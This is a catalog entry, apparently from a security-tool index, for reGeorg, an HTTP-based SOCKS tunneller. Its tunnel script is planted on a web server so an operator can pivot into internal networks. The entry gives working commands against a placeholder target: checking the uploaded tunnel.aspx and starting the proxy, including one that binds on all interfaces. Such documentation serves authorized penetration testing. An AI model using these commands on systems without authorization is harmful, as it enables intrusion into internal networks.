---
name: "regeorg"
categories:
  - blackarch-tunnel
version: "30.1ca54c2"
homepage: "https://github.com/sensepost/reGeorg"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-26"
build-system: scripts
license: custom:Creative Commons
meta-checked: "2026-11-09"
github-repo: "sensepost/reGeorg"
github-stars: 3180
github-pushed: "2025-03-06"
github-archived: false
github-issues: 20
github-match: "exact"
gh-checked: "2026-11-07"
worth: 4.4
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# regeorg

> HTTP(S)-based SOCKS tunneller from SensePost — a server-side script planted on a web server plus a local Python client that turns that URL into a SOCKS proxy.

## What it's for

reGeorg (the successor to reDuh) pivots through a web server when the only traffic allowed out is HTTP(S). You upload one of the bundled tunnel scripts — `tunnel.aspx` / `tunnel.ashx` for IIS, `tunnel.jsp` for Java containers, `tunnel.php` for PHP — to a web-accessible path on the bastion host; the local client then relays SOCKS traffic as ordinary HTTP POST requests to that script, so internal hosts reachable only from the web server become reachable from your machine through proxychains or any SOCKS-aware tool. It carries TCP streams only (no UDP), and throughput is modest because every byte travels inside HTTP request/response pairs. The client is Python 2.7-era software (the packaged entry point runs it under Python 2); its actively maintained successor with encryption and detection-evasion features is [[neo-regeorg]].

## Typical use cases

### Check that the tunnel script is live

```
curl -s http://target.example.com/uploads/tunnel.aspx
```

Outcome: a correctly planted and executable tunnel script answers a plain GET with `Georg says, 'All seems fine'`, confirming the URL, the web server's ability to execute the file, and the address you will pass to the client.

### Start the SOCKS proxy through the web server

```
regeorg -p 1080 -u http://target.example.com/uploads/tunnel.aspx
```

Outcome: a SOCKS listener opens on 127.0.0.1:1080 and the client begins relaying bytes as POSTs to the tunnel script; the packaged `regeorg` command and upstream's `python reGeorgSocksProxy.py ...` are the same program. Point proxychains, curl (`--socks5`) or a SOCKS-configured browser at the local port to reach whatever the web server can reach.

### Tune the listener and relay buffering

```
regeorg -l 0.0.0.0 -p 1080 -r 2048 -u http://target.example.com/uploads/tunnel.aspx -v
```

Outcome: the proxy binds on all interfaces instead of loopback only, each POST may carry up to 2048 bytes of tunnel payload (fewer round-trips on laggy links), and `-v` prints verbose INFO output for every relayed request — the first thing to enable when a tunnel silently stalls.

*Corpus evidence: 3 mentions in one corpus entry, including command lines for uploading the tunnel script and starting the SOCKS proxy; examples above verified against upstream documentation.*
